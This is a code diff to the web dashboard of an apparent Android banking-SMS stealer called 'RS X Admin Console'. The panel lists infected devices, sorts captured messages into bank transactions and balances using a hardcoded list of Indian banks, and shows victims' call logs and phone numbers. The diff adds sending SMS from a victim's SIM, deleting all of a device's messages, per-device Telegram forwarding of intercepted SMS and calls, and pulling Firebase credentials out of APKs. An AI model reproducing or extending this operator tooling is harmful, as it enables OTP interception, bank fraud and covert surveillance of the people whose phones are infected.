@@ -70,27 +70,30 @@ body { transition: zoom 0.2s ease; }
 .card-header .badge { background:var(--bg3); color:var(--muted); padding:6px 14px; border-radius:999px; font-size:12px; }
 
 .conn-item {
-    display:flex; align-items:center; gap:12px; padding:14px 16px;
+    display:flex; align-items:center; gap:10px; padding:14px 16px;
     background:var(--bg2); border:1px solid var(--border); border-radius:16px; margin-bottom:10px;
 }
 .conn-item .info { flex:1; min-width:0; }
 .conn-item .info .name { font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:var(--cyan); font-size:13px; }
 .conn-item .info .date { color:var(--muted); font-size:11px; margin-top:2px; }
-.conn-item button {
-    width:34px; height:34px; border-radius:50%; border:1px solid var(--border2);
-    background:var(--bg3); color:#aaa; display:grid; place-items:center; font-size:16px; transition:0.15s; flex-shrink:0;
+.conn-item .actions-row { display:flex; gap:6px; }
+.conn-item .act-btn {
+    width:32px; height:32px; border-radius:8px; border:1px solid var(--border2);
+    background:var(--bg3); display:grid; place-items:center; transition:0.15s; flex-shrink:0;
 }
-.conn-item button:hover { border-color:var(--muted); }
-.conn-item .connect { color:var(--green); border-color:rgba(0,214,143,0.25); }
-.conn-item .connect:hover { border-color:var(--green); background:rgba(0,214,143,0.08); }
-.conn-item .del { color:var(--red); border-color:rgba(255,77,77,0.2); }
-.conn-item .del:hover { border-color:var(--red); background:rgba(255,77,77,0.08); }
-.conn-item .copy-link { color:var(--gold); border-color:rgba(246,207,69,0.2); font-size:14px; }
-.conn-item .copy-link:hover { border-color:var(--gold); background:rgba(246,207,69,0.08); }
+.conn-item .act-btn svg { width:14px; height:14px; }
+.conn-item .act-btn:hover { border-color:var(--muted); background:var(--bg4); }
+.conn-item .act-btn.connect { color:var(--green); border-color:rgba(0,214,143,0.2); }
+.conn-item .act-btn.connect:hover { background:rgba(0,214,143,0.08); border-color:var(--green); }
+.conn-item .act-btn.del { color:var(--red); border-color:rgba(255,77,77,0.15); }
+.conn-item .act-btn.del:hover { background:rgba(255,77,77,0.08); border-color:var(--red); }
+.conn-item .act-btn.copy { color:var(--gold); border-color:rgba(246,207,69,0.15); }
+.conn-item .act-btn.copy:hover { background:rgba(246,207,69,0.08); border-color:var(--gold); }
 
 .btn-new {
     width:100%; padding:14px; border:1px dashed var(--border2); border-radius:16px;
     background:transparent; color:var(--muted); margin-top:16px; font-size:14px; transition:0.2s;
+    display:flex; align-items:center; justify-content:center; gap:8px;
 }
 .btn-new:hover { border-color:var(--muted); color:var(--text); }
 
@@ -105,6 +108,20 @@ body { transition: zoom 0.2s ease; }
     max-width:900px; margin:20px auto; background:var(--bg2);
     border:1px solid var(--border2); border-radius:24px; padding:28px;
     animation:modalIn 0.2s ease;
+}
+@media (min-width: 1400px) {
+    .modal-box { max-width: 1100px; }
+    .grid { grid-template-columns: repeat(5, 1fr) !important; }
+}
+@media (min-width: 1200px) and (max-width: 1399px) {
+    .modal-box { max-width: 1000px; }
+    .grid { grid-template-columns: repeat(4, 1fr) !important; }
+}
+@media (min-width: 900px) and (max-width: 1199px) {
+    .grid { grid-template-columns: repeat(3, 1fr) !important; }
+}
+@media (min-width: 600px) and (max-width: 899px) {
+    .grid { grid-template-columns: repeat(2, 1fr) !important; }
 }
 @keyframes modalIn { from { opacity:0; transform:scale(0.96) translateY(12px); } to { opacity:1; transform:scale(1) translateY(0); } }
 .modal-header { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); padding-bottom:16px; margin-bottom:20px; }
@@ -180,7 +197,7 @@ body { transition: zoom 0.2s ease; }
 .filters .filter { background:transparent; border:0; color:var(--muted); padding:6px 14px; border-radius:10px; font-size:12px; font-weight:600; white-space:nowrap; transition:0.15s; }
 .filters .filter:hover { color:var(--text); }
 .filters .filter.active { background:rgba(255,48,39,0.12); color:var(--red); border:1px solid rgba(255,48,39,0.2); }
-.filters .sort { background:var(--bg2); border:1px solid var(--border); color:var(--muted); padding:6px 14px; border-radius:10px; font-size:12px; font-weight:600; }
+.filters .sort { background:var(--bg2); border:1px solid var(--border); color:var(--muted); padding:6px 14px; border-radius:10px; font-size:12px; font-weight:600; display:flex; align-items:center; gap:6px; }
 .filters .sort:hover { border-color:var(--border2); color:var(--text); }
 .filters .refresh-btn {
     width:32px; height:32px; border-radius:8px; background:var(--bg2); border:1px solid var(--border);
@@ -188,11 +205,12 @@ body { transition: zoom 0.2s ease; }
 }
 .filters .refresh-btn:hover { border-color:var(--border2); color:var(--text); }
 
-.grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(280px,1fr)); gap:16px; padding:16px 26px 30px; }
+.grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(260px,1fr)); gap:16px; padding:16px 26px 30px; }
 
 .device-card {
     background:var(--bg2); border:1px solid var(--border); border-radius:16px;
-    padding:18px; cursor:pointer; transition:0.15s ease; min-height:200px; position:relative;
+    padding:18px; cursor:pointer; transition:0.15s ease; min-height:220px; position:relative;
+    display:flex; flex-direction:column;
 }
 .device-card:hover { border-color:var(--border2); transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,0,0,0.3); }
 .device-card .top { display:flex; gap:12px; align-items:flex-start; }
@@ -222,11 +240,28 @@ body { transition: zoom 0.2s ease; }
 .device-card .details .item small { display:block; color:var(--dim); font-size:9px; font-weight:800; letter-spacing:0.06em; text-transform:uppercase; }
 .device-card .details .item div { margin-top:2px; color:var(--text); font-size:12px; font-weight:500; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
 .device-card .phone-display { margin-top:8px; padding:4px 10px; background:rgba(24,191,255,0.06); border:1px solid rgba(24,191,255,0.1); border-radius:6px; font-size:12px; color:var(--cyan); display:inline-block; }
+.device-card .card-actions {
+    position:absolute; top:12px; right:12px; display:flex; gap:6px; z-index:2;
+}
+.device-card .card-actions .ca-btn {
+    width:30px; height:30px; border-radius:8px; background:rgba(13,17,26,0.8);
+    border:1px solid var(--border); display:grid; place-items:center;
+    color:var(--muted); font-size:13px; transition:0.15s; backdrop-filter:blur(4px);
+}
+.device-card .card-actions .ca-btn:hover { color:var(--text); border-color:var(--border2); }
+.device-card .card-actions .ca-btn.tg { color:var(--cyan); border-color:rgba(24,191,255,0.2); }
+.device-card .card-actions .ca-btn.tg.active { background:rgba(24,191,255,0.15); border-color:var(--cyan); color:var(--cyan); }
+.device-card .card-actions .ca-btn.tg:hover { background:rgba(24,191,255,0.1); }
+.device-card .card-actions .ca-btn.sms { color:var(--gold); border-color:rgba(246,207,69,0.2); }
+.device-card .card-actions .ca-btn.sms:hover { background:rgba(246,207,69,0.1); }
+.device-card .tg-indicator {
+    position:absolute; bottom:12px; right:12px;
+    width:8px; height:8px; border-radius:50%; background:var(--cyan);
+    box-shadow:0 0 8px rgba(24,191,255,0.4); display:none;
+}
+.device-card .tg-indicator.active { display:block; }
 .empty-grid { grid-column:1/-1; text-align:center; color:var(--muted); padding:70px 0; font-size:14px; }
-.send-btn-small { position:absolute; top:12px; right:12px; background:rgba(24,191,255,0.08); border:1px solid rgba(24,191,255,0.15); border-radius:8px; color:var(--cyan); padding:4px 10px; font-size:14px; cursor:pointer; transition:0.15s; opacity:0.5; z-index:2; }
-.send-btn-small:hover { opacity:1; background:rgba(24,191,255,0.15); }
 
-/* EMPTY STATE */
 .empty-state {
     grid-column:1/-1; display:flex; flex-direction:column; align-items:center;
     justify-content:center; padding:100px 20px; text-align:center;
@@ -262,7 +297,6 @@ body { transition: zoom 0.2s ease; }
 .tab-content { display:none; }
 .tab-content.active { display:block; }
 
-/* INFO TAB - ROW STYLE */
 .info-list { background:var(--bg2); border:1px solid var(--border); border-radius:12px; overflow:hidden; }
 .info-row {
     display:flex; justify-content:space-between; align-items:center;
@@ -276,7 +310,6 @@ body { transition: zoom 0.2s ease; }
     letter-spacing:0.08em; margin:20px 0 10px 4px;
 }
 
-/* BANK TAB */
 .bank-detect-header { margin-bottom:16px; }
 .bank-detect-header .line1 { color:var(--muted); font-size:13px; }
 .bank-detect-header .line2 { color:var(--green); font-size:13px; margin-top:2px; }
@@ -327,7 +360,6 @@ body { transition: zoom 0.2s ease; }
     font-size:22px; font-weight:800;
 }
 .tx-card-bank .tx-mid-amt.balance { color:var(--text); }
-.tx-card-bank .tx-mid-amt.txn { color:var(--cyan); }
 .tx-card-bank .tx-divider {
     height:1px; background:var(--border); margin:10px 0;
 }
@@ -348,7 +380,7 @@ body { transition: zoom 0.2s ease; }
 .sms-section .sms-search { margin-bottom:12px; display:flex; gap:8px; }
 .sms-section .sms-search input { flex:1; padding:8px 12px; border:1px solid var(--border); border-radius:10px; background:var(--bg3); color:var(--text); font-size:13px; }
 .sms-section .sms-search input:focus { border-color:var(--cyan); }
-.sms-item { padding:12px 16px; background:var(--bg3); border:1px solid var(--border); border-radius:12px; margin-bottom:8px; animation:fadeIn 0.2s ease; }
+.sms-item { padding:12px 16px; background:var(--bg3); border:1px solid var(--border); border-radius:12px; margin-bottom:8px; animation:fadeIn 0.2s ease; position:relative; }
 @keyframes fadeIn { from { opacity:0; transform:translateY(6px); } to { opacity:1; transform:translateY(0); } }
 .sms-item .sms-header { display:flex; justify-content:space-between; color:var(--dim); font-size:11px; margin-bottom:4px; flex-wrap:wrap; }
 .sms-item .sms-body { color:var(--text); font-size:14px; word-break:break-word; line-height:1.5; }
@@ -367,6 +399,49 @@ body { transition: zoom 0.2s ease; }
 .sms-item .tx-type.debit { background:rgba(255,77,77,0.12); color:var(--red); }
 .sms-item .bank-name-tag { display:inline-block; background:rgba(246,207,69,0.08); color:var(--gold); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; border:1px solid rgba(246,207,69,0.15); }
 .sms-item .balance-tag { display:inline-block; background:rgba(0,214,143,0.06); color:var(--green); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; border:1px solid rgba(0,214,143,0.15); }
+.sms-item .sms-actions { display:flex; gap:6px; margin-top:8px; }
+.sms-item .sms-actions .fwd-btn {
+    padding:4px 10px; border-radius:6px; border:1px solid rgba(24,191,255,0.2);
+    background:rgba(24,191,255,0.06); color:var(--cyan); font-size:11px; font-weight:600;
+    display:flex; align-items:center; gap:4px; transition:0.15s;
+}
+.sms-item .sms-actions .fwd-btn:hover { background:rgba(24,191,255,0.12); border-color:var(--cyan); }
+
+.call-item {
+    padding:12px 16px; background:var(--bg3); border:1px solid var(--border);
+    border-radius:12px; margin-bottom:8px; animation:fadeIn 0.2s ease; position:relative;
+}
+.call-item .call-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; }
+.call-item .call-number { font-weight:700; font-size:14px; color:var(--text); }
+.call-item .call-type { font-size:11px; font-weight:700; padding:2px 10px; border-radius:4px; }
+.call-item .call-type.incoming { background:rgba(0,214,143,0.12); color:var(--green); }
+.call-item .call-type.outgoing { background:rgba(24,191,255,0.12); color:var(--cyan); }
+.call-item .call-type.missed { background:rgba(255,77,77,0.12); color:var(--red); }
+.call-item .call-meta { color:var(--dim); font-size:12px; display:flex; gap:12px; }
+.call-item .call-duration { color:var(--muted); }
+.call-item .call-actions { display:flex; gap:6px; margin-top:8px; }
+.call-item .call-actions .fwd-btn {
+    padding:4px 10px; border-radius:6px; border:1px solid rgba(24,191,255,0.2);
+    background:rgba(24,191,255,0.06); color:var(--cyan); font-size:11px; font-weight:600;
+    display:flex; align-items:center; gap:4px; transition:0.15s;
+}
+.call-item .call-actions .fwd-btn:hover { background:rgba(24,191,255,0.12); border-color:var(--cyan); }
+
+.number-main {
+    background:linear-gradient(135deg, rgba(0,214,143,0.08), rgba(0,214,143,0.02));
+    border:1px solid rgba(0,214,143,0.2); border-radius:14px;
+    padding:16px; margin-bottom:12px;
+}
+.number-main .nm-label { color:var(--green); font-size:10px; font-weight:800; text-transform:uppercase; letter-spacing:0.08em; }
+.number-main .nm-number { font-size:24px; font-weight:900; color:var(--text); margin-top:4px; }
+.number-list { display:flex; flex-direction:column; gap:6px; }
+.number-row {
+    display:flex; justify-content:space-between; align-items:center;
+    padding:10px 14px; background:var(--bg3); border:1px solid var(--border);
+    border-radius:10px;
+}
+.number-row .num { font-weight:600; font-size:14px; color:var(--cyan); }
+.number-row .count { color:var(--muted); font-size:12px; }
 
 .send-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:16px; }
 .send-grid .full { grid-column:1/-1; }
@@ -385,16 +460,27 @@ body { transition: zoom 0.2s ease; }
 .send-result.ok { display:block; background:rgba(0,214,143,0.08); color:var(--green); border:1px solid rgba(0,214,143,0.15); }
 .send-result.err { display:block; background:rgba(255,77,77,0.08); color:var(--red); border:1px solid rgba(255,77,77,0.15); }
 
-@media (max-width:900px) {
-    .grid { grid-template-columns:repeat(auto-fill, minmax(240px,1fr)); }
+.danger-btn {
+    background:rgba(255,48,39,0.08); border:1px solid rgba(255,48,39,0.2);
+    color:var(--red); padding:10px 18px; border-radius:12px;
+    font-weight:700; font-size:13px; transition:0.15s; display:flex; align-items:center; gap:6px;
 }
+.danger-btn:hover { background:rgba(255,48,39,0.15); border-color:var(--red); }
+
+.icon-btn {
+    width:32px; height:32px; border-radius:8px; background:var(--bg3);
+    border:1px solid var(--border); color:var(--muted);
+    display:grid; place-items:center; transition:0.15s;
+}
+.icon-btn:hover { border-color:var(--border2); color:var(--text); }
+
 @media (max-width:650px) {
     .topbar { padding:0 14px; gap:10px; flex-wrap:wrap; height:auto; padding:12px 14px; }
     .topbar .logo { font-size:14px; letter-spacing:1px; }
     .topbar .search { max-width:100%; order:3; flex-basis:100%; }
     .topbar .actions .status { display:none; }
     .topbar .actions .clock { font-size:11px; min-width:50px; }
-    .grid { grid-template-columns:1fr; padding:10px 14px 20px; }
+    .grid { grid-template-columns:1fr !important; padding:10px 14px 20px; }
     .statsbar { padding:12px 14px; gap:16px; flex-wrap:wrap; }
     .filters { padding:10px 14px; flex-wrap:wrap; }
     .modal-box { padding:20px; }
@@ -404,6 +490,8 @@ body { transition: zoom 0.2s ease; }
     .toast { white-space:normal; max-width:90%; text-align:center; }
     .detail-tabs .tab-btn { padding:8px 12px; font-size:12px; }
     .zoom-controls { display:none; }
+    .conn-item .actions-row { gap:4px; }
+    .conn-item .act-btn { width:28px; height:28px; }
 }
 </style>
 <base target="_blank">
@@ -413,6 +501,21 @@ body { transition: zoom 0.2s ease; }
 
 <div id="toast" class="toast"></div>
 
+<!-- SVG Icons Definition -->
+<svg style="display:none">
+    <symbol id="icon-link" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></symbol>
+    <symbol id="icon-play" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"/></symbol>
+    <symbol id="icon-trash" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></symbol>
+    <symbol id="icon-plus" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></symbol>
+    <symbol id="icon-telegram" viewBox="0 0 24 24"><path fill="currentColor" d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></symbol>
+    <symbol id="icon-sms" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></symbol>
+    <symbol id="icon-refresh" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></symbol>
+    <symbol id="icon-send" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></symbol>
+    <symbol id="icon-forward" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 17 20 12 15 7"/><path d="M4 18v-1a4 4 0 0 1 4-4h12"/></symbol>
+    <symbol id="icon-shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></symbol>
+    <symbol id="icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></symbol>
+</svg>
+
 <section id="homeScreen" class="screen">
     <div class="shell">
         <div class="brand">
@@ -421,36 +524,36 @@ body { transition: zoom 0.2s ease; }
             <p>Device Management Console</p>
         </div>
         <div class="card">
-            <div class="card-header"><h3>◌ Saved Accounts</h3><span class="badge" id="connCount">0</span></div>
+            <div class="card-header"><h3>Saved Accounts</h3><span class="badge" id="connCount">0</span></div>
             <div id="connectionsList"></div>
-            <button class="btn-new" id="newConnBtn">＋ New Account</button>
+            <button class="btn-new" id="newConnBtn"><svg width="16" height="16"><use href="#icon-plus"/></svg> New Account</button>
             <div id="homeError" class="error-text hidden"></div>
             <div style="margin-top:14px;text-align:center;font-size:12px;color:var(--dim)">
                 <span>Share link: </span>
                 <input id="shareLinkInput" style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:4px 10px;color:var(--text);font-size:12px;width:80%;margin-top:4px" readonly />
             </div>
         </div>
-        <div class="footer-text">RS X Admin Console · All connections are logged</div>
+        <div class="footer-text">RS X Admin Console</div>
     </div>
 </section>
 
 <div class="modal-overlay" id="newAccountModal">
     <div class="modal-box" style="max-width:560px">
-        <div class="modal-header"><h2>New Firebase Account</h2><button class="close" id="closeAccountModal">&times;</button></div>
+        <div class="modal-header"><h2>Firebase Account</h2><button class="close" id="closeAccountModal">&times;</button></div>
         <div class="form-group"><label>Project Label (optional)</label><input id="accLabel" placeholder="e.g. My Project" value="" /></div>
         <div class="form-group"><label>Firebase Database URL</label><input id="accUrl" placeholder="https://project.firebaseio.com" /></div>
         <div class="form-group"><label>Authentication Key / Secret</label><input id="accKey" type="password" placeholder="AIza..." /></div>
         <div class="form-group">
             <label>Extract from APK (optional)</label>
             <div class="file-upload" id="apkUploadArea">
-                <span>📁 Upload APK File</span>
+                <span>Upload APK File</span>
                 <input type="file" id="apkFileInput" accept=".apk,.txt,.json" />
-                <div style="font-size:12px;margin-top:6px;color:var(--dim)">Auto‑extracts Firebase URL &amp; API Key</div>
+                <div style="font-size:12px;margin-top:6px;color:var(--dim)">Auto-extracts Firebase URL & API Key</div>
             </div>
         </div>
         <div id="setupError" class="error-text hidden"></div>
         <div class="form-actions">
-            <button class="primary" id="saveAccountBtn">⚡ Save Account</button>
+            <button class="primary" id="saveAccountBtn">Save Account</button>
             <button class="secondary" id="cancelAccountBtn">Cancel</button>
         </div>
     </div>
@@ -462,13 +565,13 @@ body { transition: zoom 0.2s ease; }
         <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
         <div class="actions">
             <div class="zoom-controls">
-                <button class="zoom-btn" id="zoomOut" title="Zoom Out">−</button>
-                <button class="zoom-btn" id="zoomReset" title="Reset">⟲</button>
+                <button class="zoom-btn" id="zoomOut" title="Zoom Out">-</button>
+                <button class="zoom-btn" id="zoomReset" title="Reset">R</button>
                 <button class="zoom-btn" id="zoomIn" title="Zoom In">+</button>
             </div>
-            <span class="status" id="statusLabel">● Connected</span>
+            <span class="status" id="statusLabel">Connected</span>
             <span class="clock" id="clockDisplay">--:--:--</span>
-            <a class="telegram" href="https://t.me/RSPANNEL" target="_blank" title="Telegram"><svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg></a>
+            <a class="telegram" href="https://t.me/RSPANNEL" target="_blank" title="Telegram"><svg viewBox="0 0 24 24"><use href="#icon-telegram"/></svg></a>
             <button class="logout" id="logoutBtn">Exit</button>
         </div>
     </header>
@@ -485,26 +588,28 @@ body { transition: zoom 0.2s ease; }
         <button class="filter" data-filter="upi">Upi</button>
         <button class="filter" data-filter="bank">Bank</button>
         <button class="filter" data-filter="card">Card</button>
-        <button class="sort" id="sortBtn">Newest ▼</button>
-        <button class="refresh-btn" id="refreshBtn" title="Refresh">↻</button>
+        <button class="sort" id="sortBtn">Newest</button>
+        <button class="refresh-btn" id="refreshBtn" title="Refresh"><svg width="16" height="16"><use href="#icon-refresh"/></svg></button>
     </div>
-    <div class="grid" id="deviceGrid"><div class="empty-grid">Loading devices…</div></div>
+    <div class="grid" id="deviceGrid"><div class="empty-grid">Loading devices...</div></div>
 </section>
 
 <div class="modal-overlay" id="detailModal">
     <div class="modal-box">
         <div class="modal-header"><h2 id="detailDeviceName">Device</h2><button class="close" id="closeDetailModal">&times;</button></div>
         <div style="display:flex;gap:12px;margin-bottom:8px;flex-wrap:wrap;align-items:center">
-            <span id="detailStatus" style="font-weight:700">● Online</span>
-            <span>🔋 <span id="detailBattery">—</span></span>
-            <span style="color:var(--gold)">🏦 Bank SMS: <span id="detailBankCount">0</span></span>
-            <span style="color:var(--muted)">📩 SMS: <span id="detailSmsCount">0</span></span>
-            <span style="color:var(--cyan)">📱 <span id="detailPhoneDisplay">—</span></span>
+            <span id="detailStatus" style="font-weight:700">Online</span>
+            <span>Battery: <span id="detailBattery">-</span></span>
+            <span style="color:var(--gold)">Bank SMS: <span id="detailBankCount">0</span></span>
+            <span style="color:var(--muted)">SMS: <span id="detailSmsCount">0</span></span>
+            <span style="color:var(--cyan)">Phone: <span id="detailPhoneDisplay">-</span></span>
         </div>
         <div class="detail-tabs">
             <button class="tab-btn active" data-tab="info">Info</button>
             <button class="tab-btn" data-tab="bank">Bank <span class="badge" id="bankTabBadge">0</span></button>
             <button class="tab-btn" data-tab="sms">SMS <span class="badge" id="smsTabBadge">0</span></button>
+            <button class="tab-btn" data-tab="calls">Calls <span class="badge" id="callsTabBadge">0</span></button>
+            <button class="tab-btn" data-tab="numbers">Numbers</button>
             <button class="tab-btn" data-tab="send">Send</button>
         </div>
         <div class="tab-content active" id="tabInfo">
@@ -519,22 +624,53 @@ body { transition: zoom 0.2s ease; }
         </div>
         <div class="tab-content" id="tabSms">
             <div class="sms-section">
-                <h3>📩 Messages <span class="count" id="smsCountLabel">(0)</span></h3>
+                <h3>Messages <span class="count" id="smsCountLabel">(0)</span></h3>
                 <div class="sms-search">
                     <input id="smsSearch" placeholder="Search messages..." />
-                    <button class="btn-icon" id="refreshSmsBtn" style="padding:8px 12px">↻</button>
+                    <button class="icon-btn" id="refreshSmsBtn" title="Refresh"><svg width="14" height="14"><use href="#icon-refresh"/></svg></button>
+                    <button class="danger-btn" id="deleteAllSmsBtn">Delete All</button>
                 </div>
                 <div id="messageList" style="max-height:350px;overflow-y:auto"></div>
             </div>
+        </div>
+        <div class="tab-content" id="tabCalls">
+            <div class="sms-section">
+                <h3>Call Logs <span class="count" id="callsCountLabel">(0)</span></h3>
+                <div id="callList" style="max-height:400px;overflow-y:auto"></div>
+            </div>
+        </div>
+        <div class="tab-content" id="tabNumbers">
+            <div id="numbersContainer"></div>
         </div>
         <div class="tab-content" id="tabSend">
             <div class="send-grid">
                 <div class="full"><label>Select SIM</label><div class="sim-toggle"><button class="active" data-sim="1">SIM 1</button><button data-sim="2">SIM 2</button></div></div>
                 <div class="full"><label>Recipient</label><input id="smsTo" placeholder="+919876543210" /></div>
                 <div class="full"><label>Message</label><textarea id="smsBody" placeholder="Type your message here..."></textarea></div>
-                <div class="full"><button class="send-btn" id="sendSmsBtn">📤 Send via SIM 1</button><div class="send-result" id="sendResult"></div></div>
-                <div class="full" style="color:var(--dim);font-size:12px;text-align:center">Use device number: <span id="sendDevicePhone">—</span></div>
+                <div class="full"><button class="send-btn" id="sendSmsBtn">Send via SIM 1</button><div class="send-result" id="sendResult"></div></div>
+                <div class="full" style="color:var(--dim);font-size:12px;text-align:center">Use device number: <span id="sendDevicePhone">-</span></div>
             </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal-overlay" id="telegramDeviceModal">
+    <div class="modal-box" style="max-width:480px">
+        <div class="modal-header"><h2 id="tgDeviceModalTitle">Telegram Config</h2><button class="close" id="closeTelegramDeviceModal">&times;</button></div>
+        <div class="form-group"><label>Bot Token</label><input id="tgDeviceToken" placeholder="123456:ABC-DEF1234..." /></div>
+        <div class="form-group"><label>Chat ID</label><input id="tgDeviceChatId" placeholder="123456789" /></div>
+        <div class="form-group" style="display:flex;gap:20px;align-items:center;margin-top:8px">
+            <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;text-transform:none;letter-spacing:0;font-weight:500;color:var(--text)">
+                <input type="checkbox" id="tgDeviceForwardSms" style="width:18px;height:18px;accent-color:var(--green)" /> Forward SMS
+            </label>
+            <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;text-transform:none;letter-spacing:0;font-weight:500;color:var(--text)">
+                <input type="checkbox" id="tgDeviceForwardCalls" style="width:18px;height:18px;accent-color:var(--green)" /> Forward Calls
+            </label>
+        </div>
+        <div style="color:var(--dim);font-size:12px;margin-top:12px">These settings are saved to Firebase bot node. The device app reads them and forwards to your bot.</div>
+        <div class="form-actions">
+            <button class="primary" id="saveTelegramDeviceBtn">Save Config</button>
+            <button class="secondary" id="cancelTelegramDeviceBtn">Cancel</button>
         </div>
     </div>
 </div>
@@ -548,6 +684,7 @@ let filterMode = 'all';
 let searchQuery = '';
 let selectedDevice = null;
 let messageCache = {};
+let callCache = {};
 let simChoice = 1;
 let pollTimer = null;
 let sortMode = 'newest';
@@ -555,8 +692,11 @@ let detailRefreshTimer = null;
 let clockTimer = null;
 let zoomLevel = 100;
 let isLoading = false;
+let tgDeviceTarget = null;
+let botConfigCache = {};
 
 const $ = id => document.getElementById(id);
+
 const homeScreen = $('homeScreen');
 const dashboardScreen = $('dashboardScreen');
 const connectionsList = $('connectionsList');
@@ -587,6 +727,7 @@ const closeDetail = $('closeDetailModal');
 const detailInfoList = $('detailInfoList');
 const detailSims = $('detailSims');
 const messageList = $('messageList');
+const callList = $('callList');
 const smsTo = $('smsTo');
 const smsBody = $('smsBody');
 const sendSmsBtn = $('sendSmsBtn');
@@ -594,56 +735,67 @@ const sendResult = $('sendResult');
 const smsSearch = $('smsSearch');
 const sendDevicePhone = $('sendDevicePhone');
 const detailPhoneDisplay = $('detailPhoneDisplay');
-const bankNameDisplay = $('bankNameDisplay');
 const bankMessageList = $('bankMessageList');
 const bankDetectHeader = $('bankDetectHeader');
 const latestBalanceCard = $('latestBalanceCard');
+const numbersContainer = $('numbersContainer');
+
+const telegramDeviceModal = $('telegramDeviceModal');
+const closeTelegramDeviceModal = $('closeTelegramDeviceModal');
+const tgDeviceModalTitle = $('tgDeviceModalTitle');
+const tgDeviceToken = $('tgDeviceToken');
+const tgDeviceChatId = $('tgDeviceChatId');
+const tgDeviceForwardSms = $('tgDeviceForwardSms');
+const tgDeviceForwardCalls = $('tgDeviceForwardCalls');
+const saveTelegramDeviceBtn = $('saveTelegramDeviceBtn');
+const cancelTelegramDeviceBtn = $('cancelTelegramDeviceBtn');
 
 const tabBtns = document.querySelectorAll('.tab-btn');
 const tabContents = {
     info: $('tabInfo'),
     bank: $('tabBank'),
     sms: $('tabSms'),
+    calls: $('tabCalls'),
+    numbers: $('tabNumbers'),
     send: $('tabSend')
 };
 
-// ZOOM
 function applyZoom() { document.body.style.zoom = zoomLevel + '%'; }
 $('zoomIn').addEventListener('click', () => { zoomLevel = Math.min(zoomLevel + 10, 150); applyZoom(); });
 $('zoomOut').addEventListener('click', () => { zoomLevel = Math.max(zoomLevel - 10, 70); applyZoom(); });
 $('zoomReset').addEventListener('click', () => { zoomLevel = 100; applyZoom(); });
 
 const BANK_NAMES = [
-    'Canara Bank', 'State Bank of India', 'SBI', 'HDFC Bank', 'ICICI Bank',
-    'Axis Bank', 'Kotak Mahindra Bank', 'Yes Bank', 'PNB', 'Punjab National Bank',
-    'Bank of Baroda', 'BOB', 'Union Bank', 'IDFC Bank', 'IndusInd Bank',
-    'RBL Bank', 'Bank of India', 'Central Bank', 'Indian Bank', 'UCO Bank',
-    'Bank of Maharashtra', 'Indian Overseas Bank', 'South Indian Bank',
-    'Federal Bank', 'Dhanlaxmi Bank', 'Karur Vysya Bank', 'Lakshmi Vilas Bank',
-    'Tamilnad Mercantile Bank', 'City Union Bank', 'Nainital Bank',
-    'Karnataka Bank', 'Saraswat Bank', 'Kalyan Janata Sahakari Bank',
-    'Shamrao Vithal Co-operative Bank', 'Citibank', 'Standard Chartered',
